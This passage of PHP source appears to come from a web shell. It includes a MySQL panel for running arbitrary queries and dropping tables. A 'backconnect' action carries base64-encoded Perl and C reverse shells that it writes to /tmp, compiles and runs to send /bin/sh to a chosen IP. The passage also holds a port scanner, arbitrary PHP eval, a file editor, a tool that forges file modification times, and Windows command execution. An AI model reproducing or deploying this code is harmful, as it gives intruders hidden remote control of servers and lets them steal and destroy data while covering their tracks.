                p(' | Current Table: &lt;a href="javascript:settable(\''.$tablename.'\');"&gt;'.$tablename.'&lt;/a&gt; [ &lt;a href="javascript:settable(\''.$tablename.'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$tablename.'\', \'drop\');"&gt;Drop&lt;/a&gt; ]');
            }
            p('&lt;/p&gt;');
            mysql_select_db($dbname);

            $getnumsql = '';
            $runquery = 0;
            if ($sql_query) {
                $runquery = 1;
            }
            $allowedit = 0;
            if ($tablename &amp;&amp; !$sql_query) {
                $sql_query = "SELECT * FROM $tablename";
                $getnumsql = $sql_query;
                $sql_query = $sql_query." LIMIT $start_limit, $pagenum";
                $allowedit = 1;
            }
            p('&lt;form action="'.$self.'" method="POST"&gt;');
            p('&lt;p&gt;&lt;table width="200" border="0" cellpadding="0" cellspacing="0"&gt;&lt;tr&gt;&lt;td colspan="2"&gt;Run SQL query/queries on database '.$dbname.':&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;textarea name="sql_query" class="area" style="width:600px;height:50px;overflow:auto;"&gt;'.htmlspecialchars($sql_query,ENT_QUOTES).'&lt;/textarea&gt;&lt;/td&gt;&lt;td style="padding:0 5px;"&gt;&lt;input class="bt" style="height:50px;" name="submit" type="submit" value="Query" /&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/p&gt;');
            makehide('tablename', $tablename);
            makehide('action','mysqladmin');
            p($dbform);
            p('&lt;/form&gt;');
            if ($tablename || ($runquery &amp;&amp; $sql_query)) {
                if ($doing == 'structure') {
                    $result = q("SHOW FULL COLUMNS FROM $tablename");
                    $rowdb = array();
                    while($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    p('&lt;h3&gt;Structure&lt;/h3&gt;');
                    p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
                    p('&lt;tr class="head"&gt;');
                    p('&lt;td&gt;Field&lt;/td&gt;');
                    p('&lt;td&gt;Type&lt;/td&gt;');
                    p('&lt;td&gt;Collation&lt;/td&gt;');
                    p('&lt;td&gt;Null&lt;/td&gt;');
                    p('&lt;td&gt;Key&lt;/td&gt;');
                    p('&lt;td&gt;Default&lt;/td&gt;');
                    p('&lt;td&gt;Extra&lt;/td&gt;');
                    p('&lt;td&gt;Privileges&lt;/td&gt;');
                    p('&lt;td&gt;Comment&lt;/td&gt;');
                    p('&lt;/tr&gt;');
                    foreach ($rowdb as $row) {
                        $thisbg = bg();
                        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
                        p('&lt;td&gt;'.$row['Field'].'&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Type'].'&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Collation'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Null'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Key'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Default'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Extra'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Privileges'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Comment'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;/tr&gt;');
                    }
                    tbfoot();
                    $result = q("SHOW INDEX FROM $tablename");
                    $rowdb = array();
                    while($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    p('&lt;h3&gt;Indexes&lt;/h3&gt;');
                    p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
                    p('&lt;tr class="head"&gt;');
                    p('&lt;td&gt;Keyname&lt;/td&gt;');
                    p('&lt;td&gt;Type&lt;/td&gt;');
                    p('&lt;td&gt;Unique&lt;/td&gt;');
                    p('&lt;td&gt;Packed&lt;/td&gt;');
                    p('&lt;td&gt;Seq_in_index&lt;/td&gt;');
                    p('&lt;td&gt;Field&lt;/td&gt;');
                    p('&lt;td&gt;Cardinality&lt;/td&gt;');
                    p('&lt;td&gt;Collation&lt;/td&gt;');
                    p('&lt;td&gt;Null&lt;/td&gt;');
                    p('&lt;td&gt;Comment&lt;/td&gt;');
                    p('&lt;/tr&gt;');
                    foreach ($rowdb as $row) {
                        $thisbg = bg();
                        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
                        p('&lt;td&gt;'.$row['Key_name'].'&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Index_type'].'&lt;/td&gt;');
                        p('&lt;td&gt;'.($row['Non_unique'] ? 'No' : 'Yes').'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.($row['Packed'] === null ? 'No' : $row['Packed']).'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Seq_in_index'].'&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Collation'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Null'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;td&gt;'.$row['Comment'].'&amp;nbsp;&lt;/td&gt;');
                        p('&lt;/tr&gt;');
                    }
                    tbfoot();
                } elseif ($doing == 'insert' || $doing == 'edit') {
                    $result = q('SHOW COLUMNS FROM '.$tablename);
                    while ($row = mysql_fetch_array($result)) {
                        $rowdb[] = $row;
                    }
                    $rs = array();
                    if ($doing == 'insert') {
                        p('&lt;h2&gt;Insert new line in '.$tablename.' table &amp;raquo;&lt;/h2&gt;');
                    } else {
                        p('&lt;h2&gt;Update record in '.$tablename.' table &amp;raquo;&lt;/h2&gt;');
                        $where = base64_decode($base64);
                        $result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
                        $rs = mysql_fetch_array($result);
                    }
                    p('&lt;form method="post" action="'.$self.'"&gt;');
                    p($dbform);
                    makehide('action','mysqladmin');
                    makehide('tablename',$tablename);
                    p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
                    foreach ($rowdb as $row) {
                        if ($rs[$row['Field']]) {
                            $value = htmlspecialchars($rs[$row['Field']]);
                        } else {
                            $value = '';
                        }
                        $thisbg = bg();
                        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
                        if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
                            p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].'&lt;/td&gt;&lt;td&gt;'.$value.'&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;');
                        } else {                            
                            p('&lt;td&gt;&lt;b&gt;'.$row['Field'].'&lt;/b&gt;&lt;br /&gt;'.$row['Type'].'&lt;/td&gt;&lt;td&gt;&lt;textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;"&gt;'.$value.'&lt;/textarea&gt;&lt;/td&gt;&lt;/tr&gt;');
                        }
                    }
                    if ($doing == 'insert') {
                        p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="insert" value="Insert" /&gt;&lt;/td&gt;&lt;/tr&gt;');
                    } else {
                        p('&lt;tr class="'.bg().'"&gt;&lt;td colspan="2"&gt;&lt;input class="bt" type="submit" name="update" value="Update" /&gt;&lt;/td&gt;&lt;/tr&gt;');
                        makehide('base64', $base64);
                    }
                    p('&lt;/table&gt;&lt;/form&gt;');
                } else {
                    $querys = @explode(';',$sql_query);
                    foreach($querys as $num=&gt;$query) {
                        if ($query) {
                            p("&lt;p&gt;&lt;b&gt;Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."&lt;/b&gt;&lt;/p&gt;");
                            switch(qy($query))
                            {
                                case 0:
                                    p('&lt;h2&gt;Error : '.mysql_error().'&lt;/h2&gt;');
                                    break;  
                                case 1:
                                    if (strtolower(substr($query,0,13)) == 'select * from') {
                                        $allowedit = 1;
                                    }
                                    if ($getnumsql) {
                                        $tatol = mysql_num_rows(q($getnumsql));
                                        $multipage = multi($tatol, $pagenum, $page, $tablename);
                                    }
                                    if (!$tablename) {
                                        $sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
                                        $sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
                                        preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
                                        $tablename = $matches[1][0];
                                    }

                                    /*********************/
                                    $getfield = q("SHOW COLUMNS FROM $tablename");
                                    $rowdb = array();
                                    $keyfied = ''; //主键字段
                                    while($row = @mysql_fetch_assoc($getfield)) {
                                        $rowdb[$row['Field']]['Key'] = $row['Key'];
                                        $rowdb[$row['Field']]['Extra'] = $row['Extra'];
                                        if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
                                            $keyfied = $row['Field'];
                                        }
                                    }
                                    /*********************/                                 
                                    //直接浏览表按照主键降序排列
                                    if ($keyfied &amp;&amp; strtolower(substr($query,0,13)) == 'select * from') {
                                        $query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
                                    }

                                    $result = q($query);

                                    p($multipage);
                                    p('&lt;table border="0" cellpadding="3" cellspacing="0"&gt;');
                                    p('&lt;tr class="head"&gt;');
                                    if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
                                    $fieldnum = @mysql_num_fields($result);
                                    for($i=0;$i&lt;$fieldnum;$i++){
                                        $name = @mysql_field_name($result, $i);
                                        $type = @mysql_field_type($result, $i);
                                        $len = @mysql_field_len($result, $i);
                                        p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");
                                    }
                                    p('&lt;/tr&gt;');

                                    while($mn = @mysql_fetch_assoc($result)){
                                        $thisbg = bg();
                                        p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
                                        $where = $tmp = $b1 = '';
                                        //选取条件字段用
                                        foreach($mn as $key=&gt;$inside){
                                            if ($inside) {
                                                //查找主键、唯一属性、自动增加的字段，找到就停止，否则组合所有字段作为条件。
                                                if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
                                                    $where = $key."='".addslashes($inside)."'";
                                                    break;
                                                }
                                                $where .= $tmp.$key."='".addslashes($inside)."'";
                                                $tmp = ' AND ';
                                            }
                                        }
                                        //读取记录用
                                        foreach($mn as $key=&gt;$inside){
                                            $b1 .= '&lt;td nowrap&gt;'.html_clean($inside).'&amp;nbsp;&lt;/td&gt;';
                                        }
                                        $where = base64_encode($where);

                                        if ($allowedit) p('&lt;td nowrap&gt;&lt;a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');"&gt;Edit&lt;/a&gt; | &lt;a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');"&gt;Del&lt;/a&gt;&lt;/td&gt;');

                                        p($b1);
                                        p('&lt;/tr&gt;');
                                        unset($b1);
                                    }
                                    p('&lt;tr class="head"&gt;');
                                    if ($allowedit) p('&lt;td&gt;Action&lt;/td&gt;');
                                    $fieldnum = @mysql_num_fields($result);
                                    for($i=0;$i&lt;$fieldnum;$i++){
                                        $name = @mysql_field_name($result, $i);
                                        $type = @mysql_field_type($result, $i);
                                        $len = @mysql_field_len($result, $i);
                                        p("&lt;td nowrap&gt;$name&lt;br&gt;&lt;span&gt;$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '&lt;b&gt; - PRIMARY&lt;/b&gt;' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '&lt;b&gt; - Auto&lt;/b&gt;' : '')."&lt;/span&gt;&lt;/td&gt;");
                                    }
                                    p('&lt;/tr&gt;');
                                    tbfoot();
                                    p($multipage);
                                    break;
                                case 2:
                                    $ar = mysql_affected_rows();
                                    p('&lt;h2&gt;affected rows : &lt;b&gt;'.$ar.'&lt;/b&gt;&lt;/h2&gt;');
                                    break;
                            }
                        }
                    }
                }
            } else {
                $query = q("SHOW TABLE STATUS");
                $table_num = $table_rows = $data_size = 0;
                $tabledb = array();
                while($table = mysql_fetch_array($query)) {
                    $data_size = $data_size + $table['Data_length'];
                    $table_rows = $table_rows + $table['Rows'];
                    $table['Data_length'] = sizecount($table['Data_length']);
                    $table_num++;
                    $tabledb[] = $table;
                }
                $data_size = sizecount($data_size);
                unset($table);
                p('&lt;table border="0" cellpadding="0" cellspacing="0"&gt;');
                p('&lt;form action="'.$self.'" method="POST"&gt;');
                makehide('action','mysqladmin');
                p($dbform);
                p('&lt;tr class="head"&gt;');
                p('&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;');
                p('&lt;td&gt;Name&lt;/td&gt;');
                p('&lt;td&gt;Rows&lt;/td&gt;');
                p('&lt;td&gt;Data_length&lt;/td&gt;');
                p('&lt;td&gt;Create_time&lt;/td&gt;');
                p('&lt;td&gt;Update_time&lt;/td&gt;');
                if ($highver) {
                    p('&lt;td&gt;Engine&lt;/td&gt;');
                    p('&lt;td&gt;Collation&lt;/td&gt;');
                }
                p('&lt;td&gt;Operate&lt;/td&gt;');
                p('&lt;/tr&gt;');
                foreach ($tabledb as $key =&gt; $table) {
                    $thisbg = bg();
                    p('&lt;tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';"&gt;');
                    p('&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name="table[]" value="'.$table['Name'].'" /&gt;&lt;/td&gt;');
                    p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\');"&gt;'.$table['Name'].'&lt;/a&gt;&lt;/td&gt;');
                    p('&lt;td&gt;'.$table['Rows'].'&lt;/td&gt;');
                    p('&lt;td&gt;'.$table['Data_length'].'&lt;/td&gt;');
                    p('&lt;td&gt;'.$table['Create_time'].'&amp;nbsp;&lt;/td&gt;');
                    p('&lt;td&gt;'.$table['Update_time'].'&amp;nbsp;&lt;/td&gt;');
                    if ($highver) {
                        p('&lt;td&gt;'.$table['Engine'].'&lt;/td&gt;');
                        p('&lt;td&gt;'.$table['Collation'].'&lt;/td&gt;');
                    }
                    p('&lt;td&gt;&lt;a href="javascript:settable(\''.$table['Name'].'\', \'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''.$table['Name'].'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;');
                    p('&lt;/tr&gt;');
                }
                p('&lt;tr class="head"&gt;');
                p('&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;');
                p('&lt;td&gt;Name&lt;/td&gt;');
                p('&lt;td&gt;Rows&lt;/td&gt;');
                p('&lt;td&gt;Data_length&lt;/td&gt;');
                p('&lt;td&gt;Create_time&lt;/td&gt;');
                p('&lt;td&gt;Update_time&lt;/td&gt;');
                if ($highver) {
                    p('&lt;td&gt;Engine&lt;/td&gt;');
                    p('&lt;td&gt;Collation&lt;/td&gt;');
                }
                p('&lt;td&gt;Operate&lt;/td&gt;');
                p('&lt;/tr&gt;');
                p('&lt;tr class='.bg().'&gt;');
                p('&lt;td&gt;&amp;nbsp;&lt;/td&gt;');
                p('&lt;td&gt;Total tables: '.$table_num.'&lt;/td&gt;');
                p('&lt;td&gt;'.$table_rows.'&lt;/td&gt;');
                p('&lt;td&gt;'.$data_size.'&lt;/td&gt;');
                p('&lt;td colspan="'.($highver ? 5 : 3).'"&gt;&amp;nbsp;&lt;/td&gt;');
                p('&lt;/tr&gt;');

                p("&lt;tr class=\"".bg()."\"&gt;&lt;td colspan=\"".($highver ? 9 : 7)."\"&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;");
                makehide('doing','backupmysql');
                formfoot();
                p("&lt;/table&gt;");
                fr($query);
            }
        }
    }
    tbfoot();
    @mysql_close();
}//end mysql

elseif ($action == 'backconnect') {
    !$yourip &amp;&amp; $yourip = $_SERVER['REMOTE_ADDR'];
    !$yourport &amp;&amp; $yourport = '12345';
    $usedb = array('perl'=&gt;'perl','c'=&gt;'c');

    $back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
        "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR".
        "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT".
        "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI".
        "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi".
        "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl".
        "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    $back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC".
        "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb".
        "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd".
        "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ".
        "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC".
        "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D".
        "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
        "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";

    if ($start &amp;&amp; $yourip &amp;&amp; $yourport &amp;&amp; $use){
        if ($use == 'perl') {
            cf('/tmp/angel_bc',$back_connect);
            $res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &amp;");
        } else {
            cf('/tmp/angel_bc.c',$back_connect_c);
            $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
            @unlink('/tmp/angel_bc.c');
            $res = execute("/tmp/angel_bc $yourip $yourport &amp;");
        }
        m("Now script try connect to $yourip port $yourport ...");
    }

    formhead(array('title'=&gt;'Back Connect'));
    makehide('action','backconnect');
    p('&lt;p&gt;');
    p('Your IP:');
    makeinput(array('name'=&gt;'yourip','size'=&gt;20,'value'=&gt;$yourip));
    p('Your Port:');
    makeinput(array('name'=&gt;'yourport','size'=&gt;15,'value'=&gt;$yourport));
    p('Use:');
    makeselect(array('name'=&gt;'use','option'=&gt;$usedb,'selected'=&gt;$use));
    makeinput(array('name'=&gt;'start','value'=&gt;'Start','type'=&gt;'submit','class'=&gt;'bt'));
    p('&lt;/p&gt;');
    formfoot();
}//end

elseif ($action == 'portscan') {
    !$scanip &amp;&amp; $scanip = '127.0.0.1';
    !$scanport &amp;&amp; $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
    formhead(array('title'=&gt;'Port Scan'));
    makehide('action','portscan');
    p('&lt;p&gt;');
    p('IP:');
    makeinput(array('name'=&gt;'scanip','size'=&gt;20,'value'=&gt;$scanip));
    p('Port:');
    makeinput(array('name'=&gt;'scanport','size'=&gt;80,'value'=&gt;$scanport));
    makeinput(array('name'=&gt;'startscan','value'=&gt;'Scan','type'=&gt;'submit','class'=&gt;'bt'));
    p('&lt;/p&gt;');
    formfoot();

    if ($startscan) {
        p('&lt;h2&gt;Result &amp;raquo;&lt;/h2&gt;');
        p('&lt;ul class="info"&gt;');
        foreach(explode(',', $scanport) as $port) {
            $fp = @fsockopen($scanip, $port, &amp;$errno, &amp;$errstr, 1); 
            if (!$fp) {
                p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span style="font-weight:bold;color:#f00;"&gt;Close&lt;/span&gt;&lt;/li&gt;');
           } else {
                p('&lt;li&gt;'.$scanip.':'.$port.' ------------------------ &lt;span style="font-weight:bold;color:#080;"&gt;Open&lt;/span&gt;&lt;/li&gt;');
                @fclose($fp);
           } 
        }
        p('&lt;/ul&gt;');
    }
}

elseif ($action == 'eval') {
    $phpcode = trim($phpcode);
    if($phpcode){
        if (!preg_match('#&lt;\?#si', $phpcode)) {
            $phpcode = "&lt;?php\n\n{$phpcode}\n\n?&gt;";
        }
        eval("?"."&gt;$phpcode&lt;?");
    }
    formhead(array('title'=&gt;'Eval PHP Code'));
    makehide('action','eval');
    maketext(array('title'=&gt;'PHP Code','name'=&gt;'phpcode', 'value'=&gt;$phpcode));
    p('&lt;p&gt;&lt;a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank"&gt;Get plugins&lt;/a&gt;&lt;/p&gt;');
    formfooter();
}//end eval

elseif ($action == 'editfile') {
    if(file_exists($opfile)) {
        $fp=@fopen($opfile,'r');
        $contents=@fread($fp, filesize($opfile));
        @fclose($fp);
        $contents=htmlspecialchars($contents);
    }
    formhead(array('title'=&gt;'Create / Edit File'));
    makehide('action','file');
    makehide('dir',$nowpath);
    makeinput(array('title'=&gt;'Current File (import new file name and new file)','name'=&gt;'editfilename','value'=&gt;$opfile,'newline'=&gt;1));
    maketext(array('title'=&gt;'File Content','name'=&gt;'filecontent','value'=&gt;$contents));
    formfooter();

    goback();

}//end editfile

elseif ($action == 'newtime') {
    $opfilemtime = @filemtime($opfile);
    //$time = strtotime("$year-$month-$day $hour:$minute:$second");
    $cachemonth = array('January'=&gt;1,'February'=&gt;2,'March'=&gt;3,'April'=&gt;4,'May'=&gt;5,'June'=&gt;6,'July'=&gt;7,'August'=&gt;8,'September'=&gt;9,'October'=&gt;10,'November'=&gt;11,'December'=&gt;12);
    formhead(array('title'=&gt;'Clone folder/file was last modified time'));
    makehide('action','file');
    makehide('dir',$nowpath);
    makeinput(array('title'=&gt;'Alter folder/file','name'=&gt;'curfile','value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));
    makeinput(array('title'=&gt;'Reference folder/file (fullpath)','name'=&gt;'tarfile','size'=&gt;120,'newline'=&gt;1));
    formfooter();
    formhead(array('title'=&gt;'Set last modified'));
    makehide('action','file');
    makehide('dir',$nowpath);
    makeinput(array('title'=&gt;'Current folder/file (fullpath)','name'=&gt;'curfile','value'=&gt;$opfile,'size'=&gt;120,'newline'=&gt;1));
    p('&lt;p&gt;year:');
    makeinput(array('name'=&gt;'year','value'=&gt;date('Y',$opfilemtime),'size'=&gt;4));
    p('month:');
    makeinput(array('name'=&gt;'month','value'=&gt;date('m',$opfilemtime),'size'=&gt;2));
    p('day:');
    makeinput(array('name'=&gt;'day','value'=&gt;date('d',$opfilemtime),'size'=&gt;2));
    p('hour:');
    makeinput(array('name'=&gt;'hour','value'=&gt;date('H',$opfilemtime),'size'=&gt;2));
    p('minute:');
    makeinput(array('name'=&gt;'minute','value'=&gt;date('i',$opfilemtime),'size'=&gt;2));
    p('second:');
    makeinput(array('name'=&gt;'second','value'=&gt;date('s',$opfilemtime),'size'=&gt;2));
    p('&lt;/p&gt;');
    formfooter();
    goback();
}//end newtime

elseif ($action == 'shell') {
    if (IS_WIN &amp;&amp; IS_COM) {
        if($program &amp;&amp; $parameter) {
            $shell= new COM('Shell.Application');
            $a = $shell-&gt;ShellExecute($program,$parameter);
            m('Program run has '.(!$a ? 'success' : 'fail'));
        }
        !$program &amp;&amp; $program = 'c:\windows\system32\cmd.exe';
        !$parameter &amp;&amp; $parameter = '/c net start &gt; '.SA_ROOT.'log.txt';
        formhead(array('title'=&gt;'Execute Program'));
        makehide('action','shell');
        makeinput(array('title'=&gt;'Program','name'=&gt;'program','value'=&gt;$program,'newline'=&gt;1));
        p('&lt;p&gt;');
        makeinput(array('title'=&gt;'Parameter','name'=&gt;'parameter','value'=&gt;$parameter));
        makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Execute'));
        p('&lt;/p&gt;');
        formfoot();
    }
    formhead(array('title'=&gt;'Execute Command'));
    makehide('action','shell');
    if (IS_WIN &amp;&amp; IS_COM) {
        $execfuncdb = array('phpfunc'=&gt;'phpfunc','wscript'=&gt;'wscript','proc_open'=&gt;'proc_open');
        makeselect(array('title'=&gt;'Use:','name'=&gt;'execfunc','option'=&gt;$execfuncdb,'selected'=&gt;$execfunc,'newline'=&gt;1));
    }
    p('&lt;p&gt;');
    makeinput(array('title'=&gt;'Command','name'=&gt;'command','value'=&gt;htmlspecialchars($command)));
    makeinput(array('name'=&gt;'submit','class'=&gt;'bt','type'=&gt;'submit','value'=&gt;'Execute'));
    p('&lt;/p&gt;');
    formfoot();

    if ($command) {
        p('&lt;hr width="100%" noshade /&gt;&lt;pre&gt;');
        if ($execfunc=='wscript' &amp;&amp; IS_WIN &amp;&amp; IS_COM) {
            $wsh = new COM('WScript.shell');
            $exec = $wsh-&gt;exec('cmd.exe /c '.$command);
            $stdout = $exec-&gt;StdOut();
            $stroutput = $stdout-&gt;ReadAll();
            echo $stroutput;
        } elseif ($execfunc=='proc_open' &amp;&amp; IS_WIN &amp;&amp; IS_COM) {
            $descriptorspec = array(
               0 =&gt; array('pipe', 'r'),
               1 =&gt; array('pipe', 'w'),
               2 =&gt; array('pipe', 'w')
            );
            $process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
            if (is_resource($process)) {
                fwrite($pipes[0], $command."\r\n");
                fwrite($pipes[0], "exit\r\n");
                fclose($pipes[0]);
                while (!feof($pipes[1])) {
                    echo fgets($pipes[1], 1024);
                }
                fclose($pipes[1]);
                while (!feof($pipes[2])) {
                    echo fgets($pipes[2], 1024);
                }
                fclose($pipes[2]);
                proc_close($process);
            }
        } else {
            echo(execute($command));
        }
        p('&lt;/pre&gt;');
    }
}//end shell

elseif ($action == 'phpenv') {
    $upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
    $adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
    !$dis_func &amp;&amp; $dis_func = 'No';     
    $info = array(
        1 =&gt; array('Server Time',date('Y/m/d h:i:s',$timestamp)),
        2 =&gt; array('Server Domain',$_SERVER['SERVER_NAME']),
        3 =&gt; array('Server IP',gethostbyname($_SERVER['SERVER_NAME'])),
        4 =&gt; array('Server OS',PHP_OS),
        5 =&gt; array('Server OS Charset',$_SERVER['HTTP_ACCEPT_LANGUAGE']),
        6 =&gt; array('Server Software',$_SERVER['SERVER_SOFTWARE']),
        7 =&gt; array('Server Web Port',$_SERVER['SERVER_PORT']),
        8 =&gt; array('PHP run mode',strtoupper(php_sapi_name())),
        9 =&gt; array('The file path',__FILE__),

        10 =&gt; array('PHP Version',PHP_VERSION),
